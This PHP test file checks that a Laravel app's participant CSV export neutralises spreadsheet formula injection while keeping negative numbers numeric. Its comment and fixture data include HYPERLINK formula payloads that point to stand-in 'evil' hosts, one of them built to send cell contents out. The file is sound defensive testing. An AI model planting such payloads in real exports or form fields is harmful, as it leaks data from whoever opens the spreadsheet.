<?php

namespace Tests\Feature;

use App\Models\Profile;
use App\Models\User;
use App\Support\Exports\SpreadsheetExport;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Participant text must not become a spreadsheet formula.
 *
 * Every export carries free text somebody typed into a form —
 * `organization_name`, `position_title`, `food_restrictions_details`, the name
 * itself. A value opening with `=`, `+`, `-` or `@` is a formula to Excel and
 * to LibreOffice, so a participant who names their employer
 * `=HYPERLINK("http://evil/?"&A1,"Payslip")` is running it on the machine of
 * whichever officer opens the register.
 *
 * What makes it easy to miss is that the application never renders it: the
 * payload is inert on every screen and only becomes live in the one place the
 * data is meant to end up.
 */
class ExportInjectionTest extends TestCase
{
    use RefreshDatabase;

    private function admin(): User
    {
        return User::factory()->create(['role' => 'admin', 'profile_completed_at' => now()]);
    }

    private function participantWith(array $profile): User
    {
        $user = User::factory()->create(['profile_completed_at' => now(), ...($profile['user'] ?? [])]);
        unset($profile['user']);
        Profile::factory()->for($user)->create($profile);

        return $user;
    }

    private function export(): string
    {
        $response = $this->actingAs($this->admin())->get('/admin/exports/participants?format=csv');

        $response->assertSuccessful();

        return $response->streamedContent();
    }

    public function test_a_formula_in_participant_text_is_neutralised(): void
    {
        $this->participantWith([
            'organization_name' => '=HYPERLINK("http://evil.test","Payslip")',
            'position_title' => '+1+1',
            'food_restrictions_details' => '@SUM(1,2)',
        ]);

        $csv = $this->export();

        // The apostrophe is what marks the cell literal; it is not displayed.
        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringContainsString("'+1+1", $csv);
        $this->assertStringContainsString("'@SUM", $csv);

        // And the live forms are gone: no cell may still open with one.
        $this->assertStringNotContainsString(',=HYPERLINK', $csv);
        $this->assertStringNotContainsString(',+1+1', $csv);
        $this->assertStringNotContainsString(',@SUM', $csv);
    }

    /**
     * The guard has to be narrow or it breaks the columns an accountant sums.
     * A refund amount is a string that opens with `-`, and prefixing it turns
     * the revenue column into text.
     */
    public function test_ordinary_values_are_left_alone(): void
    {
        $this->participantWith([
            'organization_name' => 'Department of Education',
            'position_title' => 'Administrative Officer IV',
        ]);

        $csv = $this->export();

        $this->assertStringContainsString('Department of Education', $csv);
        $this->assertStringNotContainsString("'Department", $csv);
        $this->assertStringNotContainsString("'Administrative", $csv);
    }

    public function test_a_negative_number_is_not_quoted_into_text(): void
    {
        $rows = [['-1500.00', '-1500.00 refunded', 'plain']];

        $method = new \ReflectionMethod(SpreadsheetExport::class, 'stringify');

        [$number, $text, $plain] = $method->invoke(null, $rows[0]);

        $this->assertSame('-1500.00', $number, 'A bare negative number must stay numeric for the spreadsheet.');
        $this->assertSame("'-1500.00 refunded", $text, 'Text opening with a dash is still a formula to Excel.');
        $this->assertSame('plain', $plain);
    }
}
